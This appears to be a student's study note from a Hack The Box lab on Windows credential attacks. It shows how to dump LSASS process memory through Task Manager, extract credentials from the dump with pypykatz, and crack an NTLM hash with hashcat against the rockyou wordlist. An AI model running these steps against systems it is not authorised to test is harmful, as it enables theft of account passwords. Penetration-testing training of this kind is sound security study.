...
![[Pasted image 20250516120350.png]]
...
With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:
  ![[Pasted image 20250516120724.png]]
  `Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file``Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`
  ![[Pasted image 20250516120817.png]]
...
```shell-session
pepedavidphone@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
...
```shell-session
pepedavidphone@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
